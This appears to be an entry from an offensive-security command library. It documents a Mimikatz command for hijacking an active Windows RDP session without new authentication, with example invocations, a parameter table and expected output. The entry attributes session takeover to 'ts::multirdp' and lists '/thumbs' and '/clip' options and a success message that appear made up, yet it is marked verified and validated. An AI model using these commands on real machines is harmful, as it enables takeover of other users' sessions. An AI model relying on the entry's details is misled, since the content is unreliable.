---
id: f45e588c-657a-4822-975a-04c94aa91c8c
name: mimikatz-ts-multirdp-connect-session
type: command
executor: cmd
data: 'ts::multirdp /id:$_SESSION_ID'
output: null
created_at: '2023-04-06T03:56:27.341239+00:00'
updated_at: '2023-10-01T12:00:00.000000+00:00'
platforms:
  - Windows
tags:
  - mimikatz
  - rdp-hijacking
verified: true
validated: true
---

# mimikatz-ts-multirdp-connect-session

## Command

```cmd
ts::multirdp /id:$_SESSION_ID
```

## Description

This Mimikatz command injects into a specific RDP session using the provided ID, allowing session takeover. It is used after listing active sessions to hijack an ongoing RDP connection without new authentication.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| /id:$_SESSION_ID | Numeric ID of the target RDP session (e.g., 3) | Yes |
| /thumbs | Display thumbnail previews of sessions (optional) | No |
| /clip | Copy clipboard from session (optional) | No |

## Examples

### Basic Usage

Connect to session ID 3:

```cmd
ts::multirdp /id:3
```

### Advanced Usage

Connect with thumbnail preview:

```cmd
ts::multirdp /id:3 /thumbs
```

## Expected Output

Successful connection: "[+] Session '3' injected successfully." followed by access to the session interface. Errors may indicate insufficient privileges or invalid ID.

## Related

- [[procedures/RDP-Session-Takeover-with-Mimikatz]]
- [[tools/Mimikatz]]
